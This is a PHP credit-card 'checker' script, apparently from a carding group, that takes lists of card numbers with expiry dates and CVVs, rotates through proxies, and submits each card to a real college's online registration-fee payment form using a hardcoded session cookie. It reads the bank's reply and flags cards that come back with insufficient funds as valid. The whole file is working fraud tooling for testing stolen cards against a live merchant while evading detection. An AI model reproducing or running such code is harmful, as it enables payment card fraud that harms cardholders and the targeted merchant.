<?php
////////THIS CHECKER MADE FCB CHECKER,SO BETTER DO NOT LEECH IT,COPY WITH CREDITS,TEAM SIMSHENTECH
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function proxys()
{
  $poxyHttps = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxyHttps) - 1);
  $poxyHttps = $poxyHttps[$myproxy];
  return $poxyHttps;
}
$proxy = proxys(); 
$ip = multiexplode(array(":", "|", ""), $proxy)[0];
////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
///////////////////////[1st Req is for AUTH]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://highbury.epearl.co.uk/payment-registration-fee/'); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://highbury.epearl.co.uk',
'Referer: https://highbury.epearl.co.uk/checkout-registration-fee/@5a4856584f5578595156557a5355647a5133644e6357684361584a4365576c4c4e555672596d6c786433425a536b497a63316c34646b39765754303d',
'cookie: PHPSESSID=4de0aa8704fa9d65f7ec6bc30781d2ef',
'Sec-Fetch-Dest: document',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-Site: same-origin'));
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Simon Cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Simon Cookies.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'loan_course_id=1103&provider_id=78&redirect_to_fork=1&country_id=1&firstname=First&lastname=Last&line1=Street+s&line2=&line4=City&county=Ceredigion&postcode=1003&gdpr_consent=0&country_id=1&email=Anyany%40gmail.com&confirm-email=Anyany%40gmail.com&telephone=4193172811&card_number='.$cc.'&name_on_card=Any+name&exp-month='.$mes.'&exp-year='.$ano.'&security_code='.$cvv.'');
$fcb = curl_exec($ch);
$code = trim(strip_tags(getStr($fcb,'class="alert alert-danger alert-dismissible" role="alert">Sorry, payment could not be taken. The message from your bank is: "','"')));
////////////////////////////===[Card Response]

if (strpos($fcb, 'INSUFF FUNDS')) {
  echo 'APPROVED CVVðŸ‘‘ Cards: '.$lista.' --> '.$code.'<br>';
}
 else {
  echo 'Cards: '.$lista.' ---> '.$code.'<br>';
}
curl_close($ch);
ob_flush();

//////////////////////////////////////////////CHECKER MADE BY MR BLUE STRANGER 560
?>